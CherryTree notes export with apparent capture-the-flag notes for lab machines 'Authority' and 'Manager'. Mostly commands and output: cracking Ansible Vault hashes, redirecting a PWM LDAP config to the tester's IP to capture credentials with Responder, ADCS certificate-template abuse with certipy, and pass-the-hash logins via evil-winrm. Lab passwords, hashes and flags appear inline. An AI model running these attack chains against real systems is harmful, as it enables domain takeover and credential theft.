          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566</rich_text>
      </node>
      <node name="exploit" unique_id="95" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698959116" ts_lastsave="1698965294">
        <rich_text>➜  authority ansible2john login &gt; login2.hash
➜  authority ansible2john admin &gt; admin.hash
➜  authority ansible2john admin2 &gt; admin2.hash

john login.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (ansible, Ansible Vault [PBKDF2-SHA256 HMAC-256 256/256 AVX2 8x])
Cost 1 (iteration count) is 10000 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 2 candidates buffered for the current salt, minimum 16 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
!@#$%^&amp;*         (login)


john admin.hash
Using default input encoding: UTF-8
Loaded 1 password hash (ansible, Ansible Vault [PBKDF2-SHA256 HMAC-256 256/256 AVX2 8x])
Cost 1 (iteration count) is 10000 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 2 candidates buffered for the current salt, minimum 16 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
!@#$%^&amp;*         (admin) 


john admin2.hash
Using default input encoding: UTF-8
Loaded 1 password hash (ansible, Ansible Vault [PBKDF2-SHA256 HMAC-256 256/256 AVX2 8x])
Cost 1 (iteration count) is 10000 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 13 candidates buffered for the current salt, minimum 16 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
!@#$%^&amp;*         (admin2)


authority cat login| ansible-vault decrypt
Vault password: 
Decryption successful
svc_pwm

authority cat admin| ansible-vault decrypt
Vault password: 
Decryption successful
pWm_@dm!N_!23

authority cat admin2| ansible-vault decrypt
Vault password: 
Decryption successful
DevT3st@123


visit </rich_text>
        <rich_text link="webs https://authority.htb:8443/pwm/private/login">https://authority.htb:8443/pwm/private/login</rich_text>
        <rich_text>

fail to login with creds

visit </rich_text>
        <rich_text link="webs https://authority.htb:8443/pwm/private/config/login">https://authority.htb:8443/pwm/private/config/login</rich_text>
        <rich_text>

login with password pWm_@dm!N_!23

download config

edit ldaps connection string

&lt;value&gt;ldaps://authority.authority.htb:636&lt;/value&gt;

to

&lt;value&gt;ldap://10.10.14.147:389&lt;/value&gt;

upload config

run responder

sudo responder -I tun0

visit </rich_text>
        <rich_text link="webs https://authority.htb:8443/pwm/private/login">https://authority.htb:8443/pwm/private/login</rich_text>
        <rich_text> and try login

[LDAP] Cleartext Client   : 10.129.70.115
[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!


login with evil winrm

evil-winrm -i authority.htb -u svc_ldap
Enter Password: 
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: </rich_text>
        <rich_text link="webs https://github.com/Hackplayers/evil-winrm#Remote-path-completion">https://github.com/Hackplayers/evil-winrm#Remote-path-completion</rich_text>
        <rich_text>
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_ldap\Documents&gt;
*Evil-WinRM* PS C:\Users\svc_ldap\desktop&gt; cat user.txt
31eca47a1a29d70b99d9dbca4e0212a0


*Evil-WinRM* PS C:\&gt; ls


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        4/23/2023   6:16 PM                Certs
d-----        3/28/2023   1:59 PM                Department Shares
d-----        3/17/2023   9:20 AM                Development
d-----         8/9/2022   7:00 PM                inetpub
d-----        3/24/2023   8:22 PM                PerfLogs
d-r---        3/25/2023   1:20 AM                Program Files
d-----        3/25/2023   1:19 AM                Program Files (x86)
d-----        11/2/2023   9:27 PM                pwm
d-r---        3/24/2023  11:27 PM                Users
d-----        7/12/2023   1:19 PM                Windows
-a----        8/10/2022   8:44 PM       84784749 pwm-onejar-2.0.3.jar


impacket-addcomputer authority.htb/svc_ldap:lDaP_1n_th3_cle4r! -dc-ip 10.129.70.115 -computer-name 'test123' -computer-pass 'test123'
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Successfully added machine account test123$ with password test123.


</rich_text>
        <rich_text link="webs https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation</rich_text>
        <rich_text>

build and upload certify.exe 

*Evil-WinRM* PS C:\users\svc_ldap&gt; .\Certify.exe find /vulnerable

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=authority,DC=htb'

[*] Listing info about the Enterprise CA 'AUTHORITY-CA'

    Enterprise CA Name            : AUTHORITY-CA
    DNS Hostname                  : authority.authority.htb
    FullName                      : authority.authority.htb\AUTHORITY-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=AUTHORITY-CA, DC=authority, DC=htb
    Cert Thumbprint               : 42A80DC79DD9CE76D032080B2F8B172BC29B0182
    Cert Serial                   : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Cert Start Date               : 4/23/2023 9:46:26 PM
    Cert End Date                 : 4/23/2123 9:56:25 PM
    Cert Chain                    : CN=AUTHORITY-CA,DC=authority,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
      Allow  ManageCA, ManageCertificates               HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                               : authority.authority.htb\AUTHORITY-CA
    Template Name                         : CorpVPN
    Schema Version                        : 2
    Validity Period                       : 20 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Document Signing, Encrypting File System, IP security IKE intermediate, IP security user, KDC Authentication, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Document Signing, Encrypting File System, IP security IKE intermediate, IP security user, KDC Authentication, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
                                      HTB\Domain Computers          S-1-5-21-622327497-3269355298-2248959698-515
                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
      Object Control Permissions
        Owner                       : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
        WriteOwner Principals       : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
                                      HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
        WriteDacl Principals        : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
                                      HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
        WriteProperty Principals    : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
                                      HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519



Certify completed in 00:00:10.1924000


certipy-ad req -username 'test1234$@authority.htb' -password 'Test123!' -ca AUTHORITY-CA -target 10.129.70.115 -template 'CorpVPN' -upn 'administrator@authority.htb'  
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 7
[*] Got certificate with UPN 'administrator@authority.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'


certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.70.115 -ldap-shell 
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Connecting to 'ldaps://10.129.70.115:636'
[*] Authenticated to '10.129.70.115' as: u:HTB\Administrator
Type help for list of commands

# change_password administrator
Got User DN: CN=Administrator,CN=Users,DC=authority,DC=htb
Attempting to set new password of: tPe1TJw_[HDWM5X
Password changed successfully!


evil-winrm -i authority.htb -u administrator 
Enter Password: 
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: </rich_text>
        <rich_text link="webs https://github.com/Hackplayers/evil-winrm#Remote-path-completion">https://github.com/Hackplayers/evil-winrm#Remote-path-completion</rich_text>
        <rich_text>
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ..
cd *Evil-WinRM* PS C:\Users\Administrator&gt; cd desktop
*Evil-WinRM* PS C:\Users\Administrator\desktop&gt; 
*Evil-WinRM* PS C:\Users\Administrator\desktop&gt; cat root.txt
d7e711decf1aae462f59c9d45957cba5</rich_text>
      </node>
      <node name="buster" unique_id="106" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698956962" ts_lastsave="1698956962"/>
    </node>
    <node name="Manager" unique_id="96" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1699117590" ts_lastsave="1699251270">
      <node name="nmap" unique_id="97" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1699117593" ts_lastsave="1699119541">
        <rich_text>sudo nmap -p- -sC -sV 10.129.69.100 -oA nmap/all
Starting Nmap 7.94 ( </rich_text>
        <rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
        <rich_text> ) at 2023-11-04 18:34 CET
Nmap scan report for 10.129.69.100
Host is up (0.029s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Manager
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-11-05 00:36:15Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-11-05T00:37:44+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-11-05T00:37:44+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.69.100:1433: 
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2023-11-05T00:37:44+00:00; +7h00m00s from scanner time.
| ms-sql-info: 
|   10.129.69.100:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-11-05T00:32:07
|_Not valid after:  2053-11-05T00:32:07
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-11-05T00:37:44+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
|_ssl-date: 2023-11-05T00:37:44+00:00; +7h00m00s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         Microsoft Windows RPC
49687/tcp open  msrpc         Microsoft Windows RPC
49705/tcp open  tcpwrapped
49722/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-11-05T00:37:06
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s

Service detection performed. Please report any incorrect results at </rich_text>
        <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
        <rich_text> .
Nmap done: 1 IP address (1 host up) scanned in 212.82 seconds</rich_text>
      </node>
      <node name="smb" unique_id="98" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1699117601" ts_lastsave="1699125942">
        <rich_text>crackmapexec smb manager.htb -u 'anonymous' -p ''  --rid-brute
SMB         manager.htb     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         manager.htb     445    DC01             [+] manager.htb\anonymous: 
SMB         manager.htb     445    DC01             [+] Brute forcing RIDs
SMB         manager.htb     445    DC01             498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         manager.htb     445    DC01             500: MANAGER\Administrator (SidTypeUser)
SMB         manager.htb     445    DC01             501: MANAGER\Guest (SidTypeUser)
SMB         manager.htb     445    DC01             502: MANAGER\krbtgt (SidTypeUser)
SMB         manager.htb     445    DC01             512: MANAGER\Domain Admins (SidTypeGroup)
SMB         manager.htb     445    DC01             513: MANAGER\Domain Users (SidTypeGroup)
SMB         manager.htb     445    DC01             514: MANAGER\Domain Guests (SidTypeGroup)
SMB         manager.htb     445    DC01             515: MANAGER\Domain Computers (SidTypeGroup)
SMB         manager.htb     445    DC01             516: MANAGER\Domain Controllers (SidTypeGroup)
SMB         manager.htb     445    DC01             517: MANAGER\Cert Publishers (SidTypeAlias)
SMB         manager.htb     445    DC01             518: MANAGER\Schema Admins (SidTypeGroup)
SMB         manager.htb     445    DC01             519: MANAGER\Enterprise Admins (SidTypeGroup)
SMB         manager.htb     445    DC01             520: MANAGER\Group Policy Creator Owners (SidTypeGroup)
SMB         manager.htb     445    DC01             521: MANAGER\Read-only Domain Controllers (SidTypeGroup)
SMB         manager.htb     445    DC01             522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)
SMB         manager.htb     445    DC01             525: MANAGER\Protected Users (SidTypeGroup)
SMB         manager.htb     445    DC01             526: MANAGER\Key Admins (SidTypeGroup)
SMB         manager.htb     445    DC01             527: MANAGER\Enterprise Key Admins (SidTypeGroup)
SMB         manager.htb     445    DC01             553: MANAGER\RAS and IAS Servers (SidTypeAlias)
SMB         manager.htb     445    DC01             571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         manager.htb     445    DC01             572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)
SMB         manager.htb     445    DC01             1000: MANAGER\DC01$ (SidTypeUser)
SMB         manager.htb     445    DC01             1101: MANAGER\DnsAdmins (SidTypeAlias)
SMB         manager.htb     445    DC01             1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
SMB         manager.htb     445    DC01             1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
SMB         manager.htb     445    DC01             1113: MANAGER\Zhong (SidTypeUser)
SMB         manager.htb     445    DC01             1114: MANAGER\Cheng (SidTypeUser)
SMB         manager.htb     445    DC01             1115: MANAGER\Ryan (SidTypeUser)
SMB         manager.htb     445    DC01             1116: MANAGER\Raven (SidTypeUser)
SMB         manager.htb     445    DC01             1117: MANAGER\JinWoo (SidTypeUser)
SMB         manager.htb     445    DC01             1118: MANAGER\ChinHae (SidTypeUser)
SMB         manager.htb     445    DC01             1119: MANAGER\Operator (SidTypeUser)



crackmapexec smb manager.htb -u 'operator' -p 'operator'
SMB         manager.htb     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         manager.htb     445    DC01             [+] manager.htb\operator:operator</rich_text>
      </node>
      <node name="ldap" unique_id="99" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1699117604" ts_lastsave="1699117606"/>
      <node name="exploit" unique_id="100" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1699117606" ts_lastsave="1699161688">
        <rich_text>mpacket-mssqlclient manager.htb/operator:operator@manager.htb -dc-ip dc01.manager.htb -windows-auth      
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (MANAGER\Operator  guest@master)&gt; 
SQL (MANAGER\Operator  guest@master)&gt; xp_dirtree /inetpub/wwwroot
subdirectory                      depth   file   
-------------------------------   -----   ----   
about.html                            1      1   

contact.html                          1      1   

css                                   1      0   

images                                1      0   

index.html                            1      1   

js                                    1      0   

service.html                          1      1   

web.config                            1      1   

website-backup-27-07-23-old.zip       1      1



at .old-conf.xml                                 
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;ldap-conf xmlns:xsi="</rich_text>
        <rich_text link="webs http://www.w3.org/2001/XMLSchema-instance">http://www.w3.org/2001/XMLSchema-instance</rich_text>
        <rich_text>"&gt;
   &lt;server&gt;
      &lt;host&gt;dc01.manager.htb&lt;/host&gt;
      &lt;open-port enabled="true"&gt;389&lt;/open-port&gt;
      &lt;secure-port enabled="false"&gt;0&lt;/secure-port&gt;
      &lt;search-base&gt;dc=manager,dc=htb&lt;/search-base&gt;
      &lt;server-type&gt;microsoft&lt;/server-type&gt;
      &lt;access-user&gt;
         &lt;user&gt;raven@manager.htb&lt;/user&gt;
         &lt;password&gt;R4v3nBe5tD3veloP3r!123&lt;/password&gt;
      &lt;/access-user&gt;
      &lt;uid-attribute&gt;cn&lt;/uid-attribute&gt;
   &lt;/server&gt;
   &lt;search type="full"&gt;
      &lt;dir-list&gt;
         &lt;dir&gt;cn=Operator1,CN=users,dc=manager,dc=htb&lt;/dir&gt;
      &lt;/dir-list&gt;
   &lt;/search&gt;
&lt;/ldap-conf&gt;


evil-winrm -i manager.htb -u raven
Enter Password: 
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: </rich_text>
        <rich_text link="webs https://github.com/Hackplayers/evil-winrm#Remote-path-completion">https://github.com/Hackplayers/evil-winrm#Remote-path-completion</rich_text>
        <rich_text>
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Raven\Documents&gt; 
*Evil-WinRM* PS C:\Users\Raven\Desktop&gt; cat user.txt
c34dce59eb45f0c3312ace98db0a2d29




➜  manager certipy-ad ca -u 'Raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.69.100 -add-officer 'Raven' -ca 'manager-DC01-CA'
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
➜  manager certipy-ad ca -u 'Raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.69.100 -ca 'manager-DC01-CA' -list-templates
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Enabled certificate templates on 'manager-DC01-CA':
    SubCA
    DirectoryEmailReplication
    DomainControllerAuthentication
    KerberosAuthentication
    EFSRecovery
    EFS
    DomainController
    WebServer
    Machine
    User
    Administrator
➜  manager certipy-ad ca -u 'Raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.69.100 -ca 'manager-DC01-CA' -enable-template 'SubCA'       
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'



➜  manager certipy-ad req -username 'raven@authority.htb' -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target 10.129.69.100 -template SubCA -upn 'administrator@manager.htb'              
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 19
Would you like to save the private key? (y/N) y
[*] Saved private key to 19.key
[-] Failed to request certificate
➜  manager certipy-ad ca -ca 'manager-DC01-CA' -issue-request 19 -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[-] Got access denied trying to issue certificate
➜  manager certipy-ad ca -u 'Raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.69.100 -add-officer 'Raven' -ca 'manager-DC01-CA' -debug
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[+] Authenticating to LDAP server
[+] Bound to ldaps://10.129.69.100:636 - ssl
[+] Default path: DC=manager,DC=htb
[+] Configuration path: CN=Configuration,DC=manager,DC=htb
[+] Trying to get DCOM connection for: 10.129.69.100
[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
➜  manager certipy-ad ca -ca 'manager-DC01-CA' -issue-request 19 -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'                   
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
➜  manager certipy-ad req -username 'raven@authority.htb' -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target 10.129.69.100 -template SubCA -upn 'administrator@manager.htb' -retrieve 19 
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 19
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate has no object SID
[*] Loaded private key from '19.key'
[*] Saved certificate and private key to 'administrator.pfx'


certipy-ad ca -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.69.166 -add-officer 'raven' -ca 'manager-DC01-CA' &amp;&amp; certipy-ad req -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target 10.129.69.166 -template SubCA -upn administrator@manager.htb &amp;&amp; certipy-ad ca -ca 'manager-DC01-CA' -issue-request 16 -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' &amp;&amp; certipy-ad req -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target 10.129.69.166 -template SubCA -upn administrator@manager.htb -retrieve 16


➜  manager timedatectl set-ntp 0
➜  manager sudo ntpdate -u manager.htb &amp;&amp; date
2023-11-05 06:20:07.410754 (+0100) +25200.546256 +/- 0.016027 manager.htb 10.129.69.166 s1 no-leap
CLOCK: time stepped by 25200.546256
Sun Nov  5 06:20:07 AM CET 2023
➜  manager certipy-ad auth -pfx 'administrator.pfx' -dc-ip 10.129.69.166 -u 'administrator'     
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@manager.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef



evil-winrm -i manager.htb -u administrator -H aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
                                        
Evil-WinRM shell v3.5
                                        
Error: Invalid hash format
➜  manager 
➜  manager evil-winrm -i manager.htb -u administrator -H ae5064c2f62317332c88629e025924ef                                 
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: </rich_text>
        <rich_text link="webs https://github.com/Hackplayers/evil-winrm#Remote-path-completion">https://github.com/Hackplayers/evil-winrm#Remote-path-completion</rich_text>
        <rich_text>
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ..
c*Evil-WinRM* PS C:\Users\Administrator&gt; cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        11/4/2023   9:53 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; cat root.txt
a5a95b7cefa0e6e8f3c123c187de81d2</rich_text>
      </node>
    </node>
    <node name="Codify" unique_id="101" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1699251270" ts_lastsave="1699251273">
      <node name="nmap" unique_id="102" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1699251273" ts_lastsave="1699254497">
        <rich_text>sudo nmap -p- -sC -sV 10.129.68.166 -oA nmap/all
Starting Nmap 7.94 ( </rich_text>
        <rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
        <rich_text> ) at 2023-11-06 07:20 CET
Nmap scan report for 10.129.68.166
Host is up (0.027s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to </rich_text>
        <rich_text link="webs http://codify.htb/">http://codify.htb/</rich_text>
        <rich_text>
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at </rich_text>
        <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
        <rich_text> .
Nmap done: 1 IP address (1 host up) scanned in 23.17 seconds</rich_text>
      </node>
